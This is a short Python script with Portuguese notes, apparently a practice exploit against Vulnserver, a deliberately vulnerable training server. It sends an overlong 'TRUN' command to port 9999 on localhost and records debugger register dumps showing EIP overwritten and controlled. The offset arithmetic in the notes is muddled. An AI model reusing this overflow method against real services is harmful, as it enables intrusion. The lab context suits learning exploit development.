
import socket

"""
10.....

2020/2 =   1010
1010/2 =   505
505/2  =   252,5
252,5/2=   126,25
126,25/2=  63,125
63,125/2=  31,5625

 A      B     C       D         E         F          G      
1010 + 505 + 252,5 + 126,25 + 63,125 + 31,5625 + 31,5625 = 2020

2020 - 31 = 1989

menos 4 bts ::EIP

31 - 4 = 27
27 +  1989 = 2016


2016 -  len(AAAAAABBBB) == Soluçao 1
2016 - 10 = Soluçao 2


-------------------------------Resultado 1:

EAX 0080DC60
ECX 0080DC50
EDX 0080E440 ASCII "AAAAAABBBB" <=======
EBX 7BCBE000 ntdll.7BCBE000
ESP 0080E440 ASCII "AAAAAABBBB" <===== 6=A's e       4 =B's
EBP 41414141
ESI 7BCBE000 ntdll.7BCBE000
EDI 7FFD4000
EIP 41414141  <=== A's ...

:.......................-Controlando EIP:
EAX 0080DC60
ECX 0080DC50
EDX 0080E440
EBX 7BCBE000 ntdll.7BCBE000
ESP 0080E440
EBP 41414141 ===> as
ESI 7BCBE000 ntdll.7BCBE000
EDI 7FFD4000
EIP 43434343  ==>  =D


=====================================================================================
50....
2100/2
1050/2
525/2
262,5/2
131,25/2
65,625/2
32,8125/2


2100 - 32 = 2068
32 - 4 = 28
2068 - 28 = 2040
"""





class Vulnserver:

    def teste1(self, ip):
        #bytes_para = 'A'*(2016 - len("AAAAAABBBB") - 8) + '0000'==> bfov
      #  bytes_para = 'A' * (2016 - len("AAAAAABBBB") ) + '0000'
        aa = (2040 - len("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB"))

        bytes_para = 'A' * aa + 'BBBBBBBB'





        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 9999))

        overflow = 'TRUN .' + bytes_para
        s.send(overflow.encode())
        resposta = s.recvfrom(20)
        #   time.sleep(1)
        print(resposta)


Vulnserver().teste1('localhost')
